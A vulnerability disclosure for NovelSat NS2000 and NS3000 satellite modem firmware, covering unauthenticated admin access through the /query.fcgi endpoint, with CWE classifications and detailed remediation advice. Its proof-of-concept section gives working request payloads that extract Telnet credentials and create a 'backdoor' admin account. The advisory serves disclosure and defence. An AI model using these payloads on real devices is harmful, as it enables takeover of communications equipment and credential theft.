# NovelSat NS2000 and NS3000  Satellite Modem / Demodulator  - unauthenticated session hijacking and administrative access  Vulnerability Disclosure

## Description

NovelSat NS2000 and NS3000 Satellite Modem / Demodulator firmware (versions `NS3000.7.x` and `NS2000.x`) are vulnerable to **unauthenticated session hijacking** and **administrative access** due to missing authentication checks on the `/query.fcgi` endpoint.

An attacker can:
- Create or delete users
- Change passwords
- Retrieve Telnet credentials  
**— all without a session token or login.**

---

## Vendor Information

- **Vendor:** NovelSat Ltd.  
- **Vendor Homepage:** [https://novelsat.com/](https://novelsat.com/)

---

## Affected Products / Code Base

- **Product:** NovelSat NS2000, NS3000 Satellite Modem / Demodulator  
- **Hardware Version:** 7.x  
- **Firmware/Software Versions:**  
  - `NS3000: NS3000.7.x`  
  - `NS2000: NS2000.x`

---

## Vulnerability Type

- Session Hijacking  
- Authentication Bypass  
- Insecure Direct Object Reference (IDOR)

---

## Vulnerable Endpoints

- `/query.fcgi`  
- `/`

---

## Exploit Summary

The NovelSat NS2000 and NS3000 firmware contain a **critical vulnerability** that allows unauthenticated attackers to perform privileged administrative actions, such as:

- Creating admin users  
- Changing or deleting users  
- Extracting Telnet credentials

This occurs due to a **lack of session validation** on sensitive backend endpoints.

---

## Impact

- Full unauthorized administrative control  
- Credential disclosure (including Telnet access)  
- Remote access and potential backdoor creation  
- Denial of service via user deletion or password change

---

## Proof of Concept (PoC)

A working Python exploit has been developed to demonstrate:

- Add new admin user  
- Change an existing user's password  
- Delete any user  
- Extract Telnet credentials

### 🔐 Extracting Telnet Credentials

```python
payload = "form_state=1&form_name=tcp_opt"
response = send_request("http://<TARGET>/query.fcgi", payload)

# Response contains Telnet user/pass if admin is logged in (no session ID needed)
parts = response.split(";")
db_index = parts.index("db")
root_value = parts[db_index + 12]
adminpass_value = parts[db_index + 16]
print(f"Telnet username: {root_value}, password: {adminpass_value}")
```
### ➕ Adding a New Admin User
```python
payload = "form_state=2&form_name=system_users&field_name=adduserb&field_val=backdoor&field_val2=backdoorpass&field_val3=1"
send_request("http://<TARGET>/query.fcgi", payload)
```
---

## **PoC Video**  

https://github.com/user-attachments/assets/29556441-c845-4a09-927e-4d0ad2715b78

---

## Vulnerability Classification

- **CWE-306** – Missing Authentication for Critical Function  
- **CWE-285** – Improper Authorization  
- **CWE-640** – Weak Session Management  
- **CWE-434** – Unrestricted Access to Sensitive Functionality

---

## Suggested Fixes

To mitigate the session hijacking and unauthorized access vulnerability in the `/query.fcgi` endpoint, the following technical and architectural measures are recommended:

### 1. Enforce Session Validation on Backend Endpoints

- Ensure all requests to sensitive endpoints (e.g., `/query.fcgi`) require a valid, active session.
- Implement backend validation of session tokens (`session_id`) or JSON Web Tokens (JWT) before executing privileged actions.

### 2. Implement Role-Based Access Controls (RBAC)

- Validate user permissions server-side based on assigned roles (e.g., admin, operator).
- Prevent unauthenticated or low-privileged users from performing privileged operations.

### 3. Use Secure Cookies or Tokens

- Store session tokens in `HttpOnly` and `Secure` cookies.
- Invalidate sessions on logout or after inactivity.
- Implement CSRF protections if cookies are used for authentication.

### 4. Obfuscate and Authenticate Form Requests

- Prevent manipulation of `form_state` and `form_name` parameters without authentication.
- Digitally sign or encrypt sensitive POST payloads to detect and prevent tampering.

### 5. Audit and Harden `/query.fcgi`

- Review backend logic for handling parameters such as `form_state`, `form_name`, and `field_name`.
- Introduce middleware to block unauthorized access before executing backend logic.
- Return standardized error responses for unauthorized users (e.g., `401 Unauthorized`).

### 6. Log and Monitor All Admin Actions

- Log all attempts to access or modify administrative settings.
- Alert on unusual activity, such as repeated requests to `/query.fcgi` from unknown IPs.

### 7. Network-Level Hardening

- Restrict access to the device using firewall rules — allow only trusted IPs.
- Disable direct WAN access; require VPN for remote access.

---

## Mitigation / Recommendations

- Enforce strict session validation across all sensitive endpoints.  
- Require authentication tokens or session ID checks for privileged actions.  
- Audit and secure firmware endpoint access control logic.  
- Place devices behind a VPN or firewall to restrict exposure.  
- Actively monitor and alert on suspicious or unauthorized configuration changes.
